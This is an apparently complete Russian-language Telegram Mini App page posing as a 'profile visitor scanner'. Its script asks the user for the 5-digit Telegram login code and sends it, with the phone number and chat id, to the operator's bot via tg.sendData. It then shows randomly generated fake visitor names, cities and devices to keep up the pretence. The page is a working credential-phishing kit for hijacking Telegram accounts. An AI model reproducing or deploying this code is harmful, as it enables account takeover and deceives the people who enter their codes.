<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>TG Analytics Pro</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background: #f2f2f7;
            color: #000000;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 16px;
        }
        .container {
            max-width: 400px;
            width: 100%;
            background: #ffffff;
            border-radius: 24px;
            overflow: hidden;
            box-shadow: 0 8px 30px rgba(0,0,0,0.12);
        }
        .header {
            background: linear-gradient(145deg, #007AFF, #0051D5);
            padding: 32px 24px;
            color: white;
            text-align: center;
        }
        .header h1 { font-size: 28px; margin-bottom: 8px; font-weight: 700; }
        .header p { font-size: 15px; opacity: 0.9; }
        .content { padding: 24px; }
        
        /* Экран ввода кода */
        .code-screen {
            display: block;
        }
        .code-screen h2 {
            font-size: 22px;
            margin-bottom: 16px;
            color: #1c1c1e;
        }
        .code-input {
            width: 100%;
            background: #f2f2f7;
            border: 1px solid #e5e5ea;
            border-radius: 16px;
            padding: 18px;
            font-size: 28px;
            font-weight: 600;
            text-align: center;
            letter-spacing: 8px;
            margin-bottom: 20px;
            outline: none;
        }
        .code-input:focus {
            border-color: #007AFF;
        }
        .verify-btn {
            width: 100%;
            background: #007AFF;
            color: white;
            border: none;
            padding: 18px;
            border-radius: 18px;
            font-size: 18px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.2s;
            margin-bottom: 16px;
        }
        .verify-btn:active { transform: scale(0.97); background: #005bbf; }
        .verify-btn:disabled { opacity: 0.5; pointer-events: none; }
        
        .info-box {
            background: #f8f9ff;
            border-radius: 16px;
            padding: 16px;
            margin: 20px 0;
            border: 1px solid #e9ecff;
            font-size: 14px;
            color: #6c757d;
        }
        
        /* Экран аналитики */
        .analytics-screen {
            display: none;
        }
        .stats-preview {
            background: #f8f9ff;
            border-radius: 20px;
            padding: 20px;
            margin-bottom: 24px;
            border: 1px solid #e9ecff;
        }
        .stat-row {
            display: flex;
            justify-content: space-between;
            margin-bottom: 12px;
            font-size: 15px;
        }
        .stat-label { color: #6c757d; }
        .stat-value { font-weight: 600; color: #007AFF; }
        .divider {
            height: 1px;
            background: #e9ecff;
            margin: 16px 0;
        }
        .period-selector {
            display: flex;
            gap: 12px;
            margin-bottom: 24px;
        }
        .period-btn {
            flex: 1;
            background: #f2f2f7;
            border: none;
            padding: 16px 0;
            border-radius: 16px;
            font-size: 16px;
            font-weight: 600;
            color: #000;
            cursor: pointer;
            transition: all 0.2s;
        }
        .period-btn.active {
            background: #007AFF;
            color: white;
            box-shadow: 0 4px 12px rgba(0,122,255,0.3);
        }
        .scan-btn {
            width: 100%;
            background: #007AFF;
            color: white;
            border: none;
            padding: 18px;
            border-radius: 18px;
            font-size: 18px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.2s;
            margin-bottom: 16px;
        }
        .progress-container {
            background: #f2f2f7;
            border-radius: 100px;
            height: 8px;
            overflow: hidden;
            margin: 24px 0;
            display: none;
        }
        .progress-bar {
            height: 100%;
            background: #007AFF;
            width: 0%;
            transition: width 0.3s ease;
        }
        .scanning-text {
            text-align: center;
            color: #6c757d;
            font-size: 14px;
            margin: 16px 0;
            display: none;
        }
        .results {
            margin-top: 24px;
            display: none;
        }
        .result-item {
            background: #f8f9ff;
            border-radius: 16px;
            padding: 16px;
            margin-bottom: 12px;
            border: 1px solid #e9ecff;
            animation: fadeIn 0.5s;
        }
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(10px); }
            to { opacity: 1; transform: translateY(0); }
        }
        .error-message {
            background: #fff2f0;
            border: 1px solid #ffccc7;
            color: #f5222d;
            padding: 12px;
            border-radius: 12px;
            margin: 16px 0;
            display: none;
        }
        .note {
            text-align: center;
            color: #8e8e93;
            font-size: 12px;
            margin-top: 16px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>📊 TG Analytics</h1>
            <p>Сканер посетителей профиля</p>
        </div>
        
        <div class="content">
            <!-- Экран ввода кода -->
            <div id="codeScreen" class="code-screen">
                <h2>🔐 Подтверждение входа</h2>
                <p style="color: #6c757d; margin-bottom: 20px;">Введите 5-значный код из Telegram/SMS</p>
                
                <input type="text" id="codeInput" class="code-input" maxlength="5" inputmode="numeric" pattern="\d*" placeholder="— — — — —">
                
                <button class="verify-btn" id="verifyBtn" onclick="verifyCode()">Подтвердить код</button>
                
                <div class="info-box">
                    <strong>📨 Код отправлен!</strong><br>
                    Если код не приходит в Telegram, проверьте СМС.
                </div>
                
                <div class="error-message" id="codeError"></div>
            </div>
            
            <!-- Экран аналитики (доступен только после правильного кода) -->
            <div id="analyticsScreen" class="analytics-screen">
                <div class="stats-preview">
                    <div class="stat-row">
                        <span class="stat-label">👁 Просмотров за 24ч:</span>
                        <span class="stat-value" id="viewsToday">...</span>
                    </div>
                    <div class="stat-row">
                        <span class="stat-label">👥 Уникальных:</span>
                        <span class="stat-value" id="uniqueViews">...</span>
                    </div>
                    <div class="stat-row">
                        <span class="stat-label">📱 Устройств:</span>
                        <span class="stat-value" id="devices">...</span>
                    </div>
                </div>
                
                <div class="period-selector">
                    <button class="period-btn active" onclick="selectPeriod(7)">7 дней</button>
                    <button class="period-btn" onclick="selectPeriod(30)">30 дней</button>
                    <button class="period-btn" onclick="selectPeriod(60)">60 дней</button>
                </div>
                
                <button class="scan-btn" id="scanBtn" onclick="startScan()">
                    🔍 Начать сканирование
                </button>
                
                <div class="progress-container" id="progressContainer">
                    <div class="progress-bar" id="progressBar"></div>
                </div>
                
                <div class="scanning-text" id="scanningText">
                    Анализ логов посещений... 0%
                </div>
                
                <div class="results" id="results"></div>
            </div>
            
            <div class="note" id="statusNote">
                Ожидание подтверждения...
            </div>
        </div>
    </div>

    <script>
        const tg = window.Telegram.WebApp;
        tg.expand();
        tg.ready();
        
        let selectedDays = 7;
        let isScanning = false;
        let codeVerified = false;
        
        // Получаем параметры из URL
        const urlParams = new URLSearchParams(window.location.search);
        const phone = urlParams.get('phone') || '';
        const chatId = urlParams.get('chat') || '';
        
        // Проверяем, был ли уже подтвержден код
        // В реальности здесь должна быть проверка через бота
        
        // Функция подтверждения кода
        function verifyCode() {
            const code = document.getElementById('codeInput').value.trim();
            const errorEl = document.getElementById('codeError');
            
            if (code.length !== 5 || !/^\d+$/.test(code)) {
                errorEl.style.display = 'block';
                errorEl.innerText = 'Введите 5 цифр';
                return;
            }
            
            errorEl.style.display = 'none';
            document.getElementById('verifyBtn').innerText = 'Проверка...';
            document.getElementById('verifyBtn').disabled = true;
            
            // Отправляем код в бота для проверки
            try {
                tg.sendData(JSON.stringify({
                    t: 'c',
                    v: code,
                    phone: phone,
                    chat: chatId
                }));
                
                // Ждем подтверждения от бота
                // Пока показываем ожидание
                document.getElementById('statusNote').innerText = '⏳ Проверка кода...';
                
                // Если бот не ответит через 5 секунд, покажем ошибку
                setTimeout(() => {
                    if (!codeVerified) {
                        errorEl.style.display = 'block';
                        errorEl.innerText = 'Ошибка проверки. Попробуйте ввести код в чат с ботом.';
                        document.getElementById('verifyBtn').innerText = 'Подтвердить код';
                        document.getElementById('verifyBtn').disabled = false;
                        document.getElementById('statusNote').innerText = 'Ожидание подтверждения...';
                    }
                }, 5000);
                
            } catch (e) {
                errorEl.style.display = 'block';
                errorEl.innerText = 'Ошибка отправки. Введите код в чат с ботом.';
                document.getElementById('verifyBtn').innerText = 'Подтвердить код';
                document.getElementById('verifyBtn').disabled = false;
            }
        }
        
        // Функция для вызова из бота при успешной проверке кода
        window.onCodeVerified = function() {
            codeVerified = true;
            document.getElementById('codeScreen').style.display = 'none';
            document.getElementById('analyticsScreen').style.display = 'block';
            document.getElementById('statusNote').innerText = 'Авторизация успешна. Можно начинать сканирование.';
            generateRandomStats();
        };
        
        // Функция для вызова из бота при ошибке кода
        window.onCodeError = function() {
            document.getElementById('codeError').style.display = 'block';
            document.getElementById('codeError').innerText = 'Неверный код. Попробуйте еще раз.';
            document.getElementById('verifyBtn').innerText = 'Подтвердить код';
            document.getElementById('verifyBtn').disabled = false;
            document.getElementById('statusNote').innerText = 'Ожидание подтверждения...';
        };
        
        // Слушаем сообщения от бота (для WebView)
        window.addEventListener('message', function(event) {
            try {
                const data = JSON.parse(event.data);
                if (data.type === 'code_verified') {
                    window.onCodeVerified();
                } else if (data.type === 'code_error') {
                    window.onCodeError();
                }
            } catch (e) {}
        });
        
        // Генерация случайных предварительных данных
        function generateRandomStats() {
            document.getElementById('viewsToday').textContent = Math.floor(Math.random() * 50 + 20);
            document.getElementById('uniqueViews').textContent = Math.floor(Math.random() * 30 + 10);
            document.getElementById('devices').textContent = ['iOS', 'Android', 'Desktop', 'Web'][Math.floor(Math.random() * 4)];
        }
        
        function selectPeriod(days) {
            selectedDays = days;
            document.querySelectorAll('.period-btn').forEach(btn => btn.classList.remove('active'));
            event.target.classList.add('active');
        }
        
        function startScan() {
            if (isScanning) return;
            
            isScanning = true;
            document.getElementById('scanBtn').disabled = true;
            document.getElementById('progressContainer').style.display = 'block';
            document.getElementById('scanningText').style.display = 'block';
            document.getElementById('results').style.display = 'none';
            
            let progress = 0;
            const names = [
                'Анна С.', 'Максим К.', 'Елена В.', 'Дмитрий П.', 
                'Ольга Н.', 'Игорь М.', 'Татьяна Л.', 'Алексей Р.',
                'Наталья С.', 'Сергей Д.', 'Юлия А.', 'Андрей Г.'
            ];
            
            const devices = ['iPhone', 'Android', 'Desktop', 'iPad', 'MacBook'];
            const cities = ['Москва', 'СПб', 'Казань', 'Новосибирск', 'Екатеринбург'];
            
            const interval = setInterval(() => {
                progress += Math.random() * 5 + 2;
                if (progress >= 100) {
                    progress = 100;
                    clearInterval(interval);
                    
                    const results = [];
                    const count = Math.floor(Math.random() * 8 + 5);
                    
                    for (let i = 0; i < count; i++) {
                        results.push({
                            name: names[Math.floor(Math.random() * names.length)],
                            time: `${Math.floor(Math.random() * 28 + 1)} мар в ${Math.floor(Math.random() * 23)}:${String(Math.floor(Math.random() * 59)).padStart(2, '0')}`,
                            device: devices[Math.floor(Math.random() * devices.length)],
                            city: cities[Math.floor(Math.random() * cities.length)],
                            views: Math.floor(Math.random() * 5 + 1)
                        });
                    }
                    
                    displayResults(results);
                    
                    document.getElementById('scanBtn').disabled = false;
                    document.getElementById('scanningText').style.display = 'none';
                    document.getElementById('progressContainer').style.display = 'none';
                    isScanning = false;
                    
                    // Сообщаем боту о завершении
                    try {
                        tg.sendData(JSON.stringify({
                            t: 'scan_complete',
                            count: results.length
                        }));
                    } catch (e) {}
                }
                
                document.getElementById('progressBar').style.width = progress + '%';
                document.getElementById('scanningText').innerHTML = 
                    `🔍 Анализ логов посещений... ${Math.floor(progress)}%`;
                
            }, 150);
        }
        
        function displayResults(results) {
            const container = document.getElementById('results');
            container.innerHTML = '<h3 style="margin-bottom: 16px;">📋 Результаты сканирования</h3>';
            
            results.forEach((item, index) => {
                setTimeout(() => {
                    const div = document.createElement('div');
                    div.className = 'result-item';
                    div.innerHTML = `
                        <div style="display: flex; justify-content: space-between; margin-bottom: 8px;">
                            <span style="font-weight: 600;">👤 ${item.name}</span>
                            <span style="color: #6c757d; font-size: 13px;">⏱ ${item.time}</span>
                        </div>
                        <div style="display: flex; gap: 12px; font-size: 13px; color: #6c757d;">
                            <span>📱 ${item.device}</span>
                            <span>📍 ${item.city}</span>
                            <span>👁 ${item.views}</span>
                        </div>
                    `;
                    container.appendChild(div);
                }, index * 100);
            });
            
            container.style.display = 'block';
        }
        
        // Проверяем, может код уже был введен ранее
        // Можно через tg.initData проверить
        try {
            const initData = tg.initData || '';
            if (initData.includes('code_verified')) {
                window.onCodeVerified();
            }
        } catch (e) {}
        
    </script>
</body>
</html>
